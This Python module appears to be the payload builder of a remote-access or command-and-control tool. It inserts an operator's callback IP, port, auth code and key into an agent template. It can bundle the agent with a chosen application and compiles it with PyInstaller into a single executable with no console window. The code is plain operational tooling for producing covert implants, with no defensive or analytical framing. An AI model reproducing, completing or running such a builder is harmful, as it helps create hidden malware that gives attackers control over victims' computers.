from colorama import Fore
from cli.system import system
from agent.builder.pyi_progress import run_pyinstaller_with_progress
from core.utils.paths import get_project_path, ensure_project_dir
import shutil
import os

BINARIES_DIR = get_project_path("storage", "binaries")
TEMPLATES_DIR = get_project_path("agent", "templates")

class builder():
    def build(type, ip, port, app='null', isstaged=False):
        ensure_project_dir("storage", "binaries")
        payload_file = f"{TEMPLATES_DIR}/payload_staged.py" if isstaged else f"{TEMPLATES_DIR}/payload.py"
        output_name = "agent_staged" if isstaged else "agent"
        
        try:
            with open(payload_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            content = content.replace("__ipaddr__", ip)
            content = content.replace("12345", str(port))
            content = content.replace("'authcode'", f"'{system.getdata('authcode')}'")
            content = content.replace("'RANDOM_KEY'", f"'{system.getdata('KEY')}'")
            
            if isstaged:
                content = content.replace('"PATH"', '"main.exe"')

            if app != 'null':
                content = content.replace("app.exe", app)
                content = content.replace("use_app = False", "use_app = True")
                
        except Exception as error:
            print(Fore.LIGHTRED_EX + f"[!] Error reading payload: {error}")
            input("OK")
            return

        temp_path = get_project_path("temp.py")
        with open(temp_path, 'w', encoding='utf-8') as file:
            file.write(content)

        try:
            if type == 'py':
                shutil.copy(temp_path, f"{BINARIES_DIR}/{output_name}.py")
            elif type == 'exe':
                os.makedirs(BINARIES_DIR, exist_ok=True)
                add_data_opts = []
                if app != 'null':
                    add_data_opts = [f'--add-data={app}{os.pathsep}.']
                build_dir = get_project_path("build")
                options = [
                    temp_path,
                    '--onefile',
                    '--noconsole',
                    '--hidden-import=plyer.platforms.win.notification',
                    '--hidden-import=plyer.platforms.win.win32',
                    f'--distpath={build_dir}',
                    f'--workpath={os.path.join(build_dir, "build")}',
                    f'--specpath={build_dir}',
                ] + add_data_opts
                rc = run_pyinstaller_with_progress(options)
                if rc == 0:
                    if os.path.exists(f"{BINARIES_DIR}/{output_name}.exe"):
                        os.remove(f"{BINARIES_DIR}/{output_name}.exe")
                    target = os.path.join(f"{BINARIES_DIR}", "temp.exe")
                    if os.path.exists(target):
                        shutil.move(target, f"{BINARIES_DIR}/{output_name}.exe")
            for f in [temp_path, get_project_path("temp.spec")]:
                if os.path.exists(f): os.remove(f)
            if os.path.exists(f"{BINARIES_DIR}/temp"): shutil.rmtree(f"{BINARIES_DIR}/temp")
            system.clear_screen()
            system.printheader()
            print(Fore.LIGHTCYAN_EX + f"[+] Build Complete!")
            print(Fore.LIGHTYELLOW_EX + f"[+] /{BINARIES_DIR}/{output_name}.{type}")
            input('OK')
        except Exception as e:
            print(Fore.LIGHTRED_EX + f"[-] Error during build: {e}")
            input("OK")
        